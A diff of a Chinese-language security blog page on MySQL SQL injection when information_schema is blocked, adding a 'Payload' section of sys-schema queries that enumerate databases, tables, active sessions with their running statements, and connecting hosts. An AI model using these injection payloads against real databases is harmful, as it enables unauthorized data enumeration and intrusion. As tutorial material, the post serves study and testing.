@@ -106,7 +106,7 @@
         </h1>
         
         <div class="mb-8 flex flex-wrap">
-          <div class="text-gray-400 text-sm mr-4">2020-06-22 · 4 min read</div>
+          <div class="text-gray-400 text-sm mr-4">2020-06-22 · 5 min read</div>
           
         </div>
         <div class="markdown mb-8" v-pre>
@@ -134,12 +134,29 @@
 </li>
 </ul>
 <p>正常情况下我们在联合查询注入时,通过判断列长度,以及显示位后,构造联合查询语句,查询MySQL的 information_schema 表来查询我们需要的数据,当以存在这种情况,可以通过:</p>
-<p>(1). 查询sys数据库进行数据查询，使用sys数据库需要满足：</p>
-<pre><code class="language-mysql">     1.数据库版本大于等于5.7
+<p>** (1). 查询sys数据库进行数据查询，使用sys数据库需要满足：**</p>
+<pre><code class="language-sql">     1.数据库版本大于等于5.7
      
      2.数据库用户为root@localohost用户
 </code></pre>
-<p>​</p>
+<p><strong>Payload:</strong><br>
+<strong>查询所有的库：</strong></p>
+<pre><code class="language-SQL">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
+SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
+</code></pre>
+<p><strong>查询指定库的表（若无则说明此表从未被访问）：</strong></p>
+<pre><code class="language-SQL">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
+SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
+</code></pre>
+<p><strong>统计所有访问过的表次数:库名,表名,访问次数</strong></p>
+<pre><code class="language-SQL">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;
+</code></pre>
+<p><strong>查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)</strong></p>
+<pre><code class="language-SQL">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;
+</code></pre>
+<p><strong>查看所有曾连接数据库的IP,总连接次数</strong></p>
+<pre><code class="language-SQL">SELECT host,total_connections FROM sys.host_summary;
+</code></pre>
 <p>(2). 通过构造虚拟表的方式,来查询数据,也就是我们说的子查询注入,数据如下</p>
 <figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/Snipaste_2020-06-22_18-57-42.png" alt="Snipaste_2020-06-22_18-57-42" loading="lazy"></figure>
 <h4 id="具体步骤如下">具体步骤如下:</h4>
